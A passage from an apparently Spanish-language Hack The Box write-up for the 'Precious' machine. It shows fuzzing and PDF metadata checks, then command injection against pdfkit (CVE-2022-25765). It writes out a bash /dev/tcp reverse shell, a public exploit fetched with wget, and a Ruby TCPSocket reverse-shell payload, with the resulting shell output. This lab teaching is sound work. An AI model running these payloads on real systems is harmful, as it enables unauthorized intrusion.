+</span></span><span style="display:flex;"><span>000155475:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;40686&#34;</span>                                                              
+</span></span><span style="display:flex;"><span>000155473:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;data-license&#34;</span>                                                       
+</span></span><span style="display:flex;"><span>000155469:   <span style="color:#ae81ff">503</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">29</span> W       <span style="color:#ae81ff">189</span> Ch      <span style="color:#e6db74">&#34;smallright16&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay demasiados archivos que, por el código de estado, no podremos ver. Vamos a eliminar ese código de estado y veamos si encuentra algo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span>404,503 -t <span style="color:#ae81ff">200</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ/
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://precious.htb/FUZZ.php/
+</span></span><span style="display:flex;"><span>Total requests: 220560
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                               
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000013:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;#&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>000000010:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;#&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>000000002:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;#&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>000000004:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">18</span> L     <span style="color:#ae81ff">42</span> W       <span style="color:#ae81ff">483</span> Ch      <span style="color:#e6db74">&#34;#&#34;</span>                                                                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: 565.2140
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">220560</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">220547</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: 390.2238
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Mmmmm no nos dio nada, entonces hagamos lo que nos pide.</p>
+<h3 id="HTTP2">Probando el Convertor PDF de la Página Web</h3>
+<p>Tratemos de darle una página cualquiera, puse &ldquo;hola_mundo&rdquo; de Wikipedia:</p>
+<p><img src="/assets/images/htb-writeup-precious/Captura3.png" alt=""></p>
+<p>No sirvió, vamos a ver que pasa si lo hacemos con una página local, hagámoslo por pasos:</p>
+<ul>
+<li>Abramos un servidor web con <strong>Python</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>Ponemos la IP y el puerto en la página web de la máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://Tu_IP:8000/
+</span></span></code></pre></div><ul>
+<li>Le damos click y nos saca el <strong>PDF</strong>:</li>
+</ul>
+<p><img src="/assets/images/htb-writeup-precious/Captura4.png" alt=""></p>
+<ul>
+<li>Descargamos el <strong>PDF</strong> y lo guardamos en nuestro directorio de trabajo.</li>
+</ul>
+<p>Bien, si bien podemos ver el contenido del <strong>PDF</strong>, podemos utilizar la herramienta <strong>pdfinfo</strong> o la herramienta <strong>exiftool</strong>.</p>
+<h4 id="HTTP3">Obteniendo Información y Metadatos de PDF con pdfinfo y exiftool</h4>
+<p>Veamos que hacen estas dos herramientas:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Herramienta pdfinfo</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es un extractor de información desde documentos PDF (Portable Document Format). Imprime el contenido del diccionario “Info” (además de alguna otra información útil), desde archivos PDF. Se ejecuta la herramienta únicamente definiendo el nombre del archivo. Lo cual muestra la información del diccionario Info.</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Herramienta exiftool</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es una herramienta de código abierto que permite leer, escribir y editar metadatos de una gran variedad de archivos (EXIF , GPS , IPTC , XMP , JFIF), no tiene interfaz gráfica se ejecuta por línea de comandos.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Entonces, ambas herramientas nos dan información especifica de los <strong>archivos PDF</strong>, pero la <strong>herramienta exiftool</strong> me parece más útil para poder ver los medatadatos de cualquier archivo.</p>
+<p>En fin, vamos a probar ambas:</p>
+<ul>
+<li>Probamos primero la <strong>herramienta pdfinfo</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pdfinfo n005vxio3bqkzrd9hf90yf60sl0jz8gu.pdf 
+</span></span><span style="display:flex;"><span>Creator:         Generated by pdfkit v0.8.6
+</span></span><span style="display:flex;"><span>Custom Metadata: no
+</span></span><span style="display:flex;"><span>Metadata Stream: yes
+</span></span><span style="display:flex;"><span>Tagged:          no
+</span></span><span style="display:flex;"><span>UserProperties:  no
+</span></span><span style="display:flex;"><span>Suspects:        no
+</span></span><span style="display:flex;"><span>Form:            none
+</span></span><span style="display:flex;"><span>JavaScript:      no
+</span></span><span style="display:flex;"><span>Pages:           <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Encrypted:       no
+</span></span><span style="display:flex;"><span>Page size:       <span style="color:#ae81ff">612</span> x <span style="color:#ae81ff">792</span> pts <span style="color:#f92672">(</span>letter<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Page rot:        <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>File size:       <span style="color:#ae81ff">18455</span> bytes
+</span></span><span style="display:flex;"><span>Optimized:       no
+</span></span><span style="display:flex;"><span>PDF version:     1.4
+</span></span></code></pre></div><ul>
+<li>Ahora la <strong>herramienta exiftool</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exiftool rw7q7mj6c9pxd8omidlhfvr64ln78637.pdf
+</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.57
+</span></span><span style="display:flex;"><span>File Name                       : rw7q7mj6c9pxd8omidlhfvr64ln78637.pdf
+</span></span><span style="display:flex;"><span>Directory                       : .
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">11</span> kB
+</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2023:04:10 13:21:27-06:00
+</span></span><span style="display:flex;"><span>File Access Date/Time           : 2023:04:10 13:21:48-06:00
+</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2023:04:10 13:22:12-06:00
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : PDF
+</span></span><span style="display:flex;"><span>File Type Extension             : pdf
+</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
+</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
+</span></span><span style="display:flex;"><span>Linearized                      : No
+</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Creator                         : Generated by pdfkit v0.8.6
+</span></span></code></pre></div><p>Interesante, vemos que utilizaron una herramienta/servicio para crear el <strong>PDF</strong>, quizá exista un Exploit, vamos a buscarlo.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="pdfkit">Aplicando Inyección de Comandos</h3>
+<p>Investigando un poco, nos encontramos con la siguiente página:</p>
+<ul>
+<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" target="_blank">Command Injection: Affecting pdfkit package, versions &lt;0.8.7.2 </a></li>
+</ul>
+<p>Esta página nos explica como se pueden inyectar comandos dentro de la URL, pues no esta bien sanitizada. Para que podamos realizar nuestras inyecciones, utilizamos el siguiente parámetro dentro de la URL que vamos a usar para convertir en <strong>PDF</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://ejemplo.com/?name<span style="color:#f92672">=</span>%20<span style="color:#e6db74">`</span>whoami<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p>Vamos a probarlo, lo haremos por pasos:</p>
+<ul>
+<li>Abre un servidor HTTP con <strong>Python</strong> en tú directorio de trabajo:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>Introduce la página local y agrega el parámetro que inyecta el comando:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://Tu_IP:8000/?name<span style="color:#f92672">=</span>%20<span style="color:#e6db74">`</span>whoami<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/htb-writeup-precious/Captura5.png">
+</p>
+<ul>
+<li>Observa lo que se obtuvo:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-precious/Captura6.png">
+</p>
+<ul>
+<li>Ahora inyecta el <strong>comando id</strong> y observa el resultado:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-precious/Captura7.png">
+</p>
+<ul>
+<li>Observa lo que ocurrio en el servidor HTTP:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>   
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>10.10.11.189 - - <span style="color:#f92672">[</span>10/Apr/2023 13:53:41<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?name=%20ruby HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span><span style="display:flex;"><span>10.10.11.189 - - <span style="color:#f92672">[</span>10/Apr/2023 13:54:08<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?name=%20uid=1001(ruby)%20gid=1001(ruby)%20groups=1001(ruby) HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</span></span></code></pre></div><p>Curiosamente, el resultado se muestra también desde el servidor HTTP</p>
+<hr>
+<p><strong>Nota</strong>: podríamos intentar capturar todo este proceso en <strong>BurpSuite</strong>, pero hay algo que nos impide inyectar comandos desde ahí, por lo que lo descarte, pero si quieres probar e investigar que es lo que nos impide la inyección de comandos, adelante.</p>
+<hr>
+<p>Excelente, de esta forma podemos inyectar comandos, es momento de poner nuestra <strong>Reverse Shell</strong> de confianza para ganar acceso a la máquina:</p>
+<ul>
+<li>
+<p>No cierres el <strong>servidor HTTP</strong>.</p>
+</li>
+<li>
+<p>Abre una <strong>netcat</strong>:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Inyecta la <strong>Reverse Shell</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://Tu_IP:8000/?name<span style="color:#f92672">=</span>%20<span style="color:#e6db74">`</span>bash -c <span style="color:#960050;background-color:#1e0010">&#39;</span>bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;1<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><ul>
+<li>Observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.189<span style="color:#f92672">]</span> <span style="color:#ae81ff">43556</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>678<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>ruby@precious:/var/www/pdfapp$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>ruby
+</span></span><span style="display:flex;"><span>ruby@precious:/var/www/pdfapp$ id
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="pdfkit2">Buscando un Exploit para pdfkit v0.8.6</h3>
+<p>A la hora de buscar un Exploit para esta versión de <strong>pdfkit</strong>, se encunetran un par que nos pueden servir mucho:</p>
+<ul>
+<li><a href="https://github.com/UNICORDev/exploit-CVE-2022-25765" target="_blank">Repositorio de UNICORDev: Exploit for CVE-2022–25765 (pdfkit) - Command Injection</a></li>
+<li><a href="https://github.com/shamo0/PDFkit-CMD-Injection" target="_blank">Repositorio de shamo0: PDFkit-CMD-Injection</a></li>
+</ul>
+<p>Vamos a probar ambos, para ver que tal funcionan.</p>
+<h4 id="pdfkit3">Probando Exploit: CVE-2022–25765 (pdfkit) - Command Injection</h4>
+<ul>
+<li>Primero vamos a descargar este Exploit:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2022-25765/main/exploit-CVE-2022-25765.py
+</span></span><span style="display:flex;"><span>https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2022-25765/main/exploit-CVE-2022-25765.py
+</span></span><span style="display:flex;"><span>Resolviendo raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>...
+</span></span><span style="display:flex;"><span>Conectando con raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span> conectado.
+</span></span><span style="display:flex;"><span>Petición HTTP enviada, esperando respuesta... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Longitud: <span style="color:#ae81ff">7849</span> <span style="color:#f92672">(</span>7.7K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Grabando a: «exploit-CVE-2022-25765.py»
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>exploit-CVE-2022-25765.py            100%<span style="color:#f92672">[========</span>&gt;<span style="color:#f92672">]</span>   7.67K  --.-KB/s    en 0s      
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>2023-10-04 14:44:54 <span style="color:#f92672">(</span>24.0 MB/s<span style="color:#f92672">)</span> - «exploit-CVE-2022-25765.py» guardado <span style="color:#f92672">[</span>7849/7849<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>Abre una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Para usarlo, debemos usar el parámetro <strong>-h</strong> y usamos <strong>Python3</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit-CVE-2022-25765.py -h
+</span></span><span style="display:flex;"><span>UNICORD Exploit <span style="color:#66d9ef">for</span> CVE-2022–25765 <span style="color:#f92672">(</span>pdfkit<span style="color:#f92672">)</span> - Command Injection
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Usage:
+</span></span><span style="display:flex;"><span>  python3 exploit-CVE-2022–25765.py -c &lt;command&gt;
+</span></span><span style="display:flex;"><span>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt;
+</span></span><span style="display:flex;"><span>  python3 exploit-CVE-2022–25765.py -c &lt;command&gt; <span style="color:#f92672">[</span>-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  python3 exploit-CVE-2022–25765.py -s &lt;local-IP&gt; &lt;local-port&gt; <span style="color:#f92672">[</span>-w &lt;http://target.com/index.html&gt; -p &lt;parameter&gt;<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>  python3 exploit-CVE-2022–25765.py -h
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>Options:
+</span></span><span style="display:flex;"><span>  -c    Custom command mode. Provide command to generate custom payload with.
+</span></span><span style="display:flex;"><span>  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
+</span></span><span style="display:flex;"><span>  -w    URL of website running vulnerable pdfkit. <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  -p    POST parameter on website running vulnerable pdfkit. <span style="color:#f92672">(</span>Optional<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  -h    Show this help menu.
+</span></span></code></pre></div><ul>
+<li>El mismo Exploit nos ayuda con un ejemplo de su uso, curiosamente, se probo este Exploit en la misma máquina:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit-CVE-2022-25765.py -s Tu_IP <span style="color:#ae81ff">443</span> -w http://precious.htb -p url
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>        _ __,~~~/_        __  ___  _______________  ___  ___
+</span></span><span style="display:flex;"><span>    ,~~<span style="color:#e6db74">`</span><span style="color:#f92672">(</span> <span style="color:#f92672">)</span>_<span style="color:#f92672">(</span> <span style="color:#f92672">)</span>-<span style="color:#ae81ff">\|</span>       / / / / |/ /  _/ ___/ __ <span style="color:#ae81ff">\/</span> _ <span style="color:#ae81ff">\/</span> _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        |/|  <span style="color:#e6db74">`</span>--.       / /_/ /    // // /__/ /_/ / , _/ // /
+</span></span><span style="display:flex;"><span>_V__v___!_!__!_____V____<span style="color:#ae81ff">\_</span>___/_/|_/___/<span style="color:#ae81ff">\_</span>__/<span style="color:#ae81ff">\_</span>___/_/|_/____/....
+</span></span><span style="display:flex;"><span>.    
+</span></span><span style="display:flex;"><span>UNICORD: Exploit <span style="color:#66d9ef">for</span> CVE-2022–25765 <span style="color:#f92672">(</span>pdfkit<span style="color:#f92672">)</span> - Command Injection
+</span></span><span style="display:flex;"><span>OPTIONS: Reverse Shell Sent to Target Website Mode
+</span></span><span style="display:flex;"><span>PAYLOAD: http://%20<span style="color:#e6db74">`</span>ruby -rsocket -e<span style="color:#e6db74">&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;Tu_IP&#34;,&#34;443&#34;))&#39;</span><span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>LOCALIP: Tu_IP:443
+</span></span><span style="display:flex;"><span>WARNING: Be sure to start a local listener on the above IP and port. <span style="color:#e6db74">&#34;nc -lnvp 443&#34;</span>.
+</span></span><span style="display:flex;"><span>WEBSITE: http://precious.htb
+</span></span><span style="display:flex;"><span>POSTARG: url
+</span></span><span style="display:flex;"><span>EXPLOIT: Payload sent to website!
+</span></span><span style="display:flex;"><span>SUCCESS: Exploit performed action.
+</span></span></code></pre></div><ul>
+<li>Observa la <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.189<span style="color:#f92672">]</span> <span style="color:#ae81ff">42476</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>ruby
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ruby<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Y listo, ganamos acceso otra vez.</p>
+<h4 id="pdfkit4">Probando Exploit: PDFkit-CMD-Injection</h4>
+<p>Esta vez, nos dan un comando que podemos usar para ganar acceso a la máquina, se trata de un comando curl que manda un petición POST que carga nuestra Reverse Shell, al parecer, solamente debemos indicar nuestra IP y un puerto.</p>
+<p>Sigamos las instrucciones que nos dicen:</p>
+<ul>
+<li>Abrimos un servidor web con <strong>Python</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>Abrimos una <strong>netcat</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>         
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><ul>
+<li>Cargamos una petición y la modificamos poniendo la dirección de la página web de la máquina y poniendo nuestra IP y un puerto:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://precious.htb/&#39;</span> -X POST -H <span style="color:#e6db74">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span> -H <span style="color:#e6db74">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&#39;</span> -H <span style="color:#e6db74">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span style="color:#e6db74">&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">&#39;Origin: http://precious.htb/&#39;</span> -H <span style="color:#e6db74">&#39;Connection: keep-alive&#39;</span> -H <span style="color:#e6db74">&#39;Referer: http://precious.htb/&#39;</span> -H <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests: 1&#39;</span> --data-raw <span 